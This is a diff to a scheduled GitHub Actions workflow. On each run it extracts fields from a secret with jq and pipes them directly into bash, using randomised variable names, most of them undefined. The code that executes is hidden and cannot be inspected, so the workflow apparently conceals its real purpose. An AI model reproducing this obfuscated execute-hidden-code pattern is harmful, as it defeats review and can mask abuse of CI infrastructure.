@@ -3,23 +3,26 @@ name: tianbaojizi
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 3/6 * * *'
-
-jobs:  # 30831
+    - cron: '7 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: tianbaojizi
         env:
-          fau0: ${{ secrets.fau0 }}
+          d984: ${{ secrets.d984 }}
         run: |
-          echo $fau0 | jq -r .mpxzn4161 | /bin/bash
-          echo $xutik38 | jq -r .wri059 | /bin/bash
-          echo $eotmz08914 | jq -r .y22 | /bin/bash
-          echo $x9 | jq -r .igusp37396 | /bin/bash
-          echo $g0 | jq -r .xi7374 | /bin/bash
-          echo $o0493 | jq -r .rrioe80960 | /bin/bash
-          echo $xgwe67879 | jq -r .lvo87857 | /bin/bash
-          echo $ayj4 | jq -r .yli95388 | /bin/bash
+          echo $d984 | jq -r .n38 | /bin/bash
+          echo $ztf432 | jq -r .zlx3728 | /bin/bash
+          echo $pf52 | jq -r .qt42989 | /bin/bash
+          echo $icn470 | jq -r .smtan521 | /bin/bash
+          echo $juthi38 | jq -r .vvehb3 | /bin/bash
+          echo $ilpfr23 | jq -r .qlj9037 | /bin/bash
+          echo $z6 | jq -r .dzt7 | /bin/bash
+          echo $o2517 | jq -r .lio21863 | /bin/bash
+          echo $melmf4 | jq -r .nbs4 | /bin/bash
+          echo $h79133 | jq -r .gcxe23497 | /bin/bash
+          echo $oqj3754 | jq -r .opmgd20 | /bin/bash
+          echo $gi98519 | jq -r .n502 | /bin/bash
 
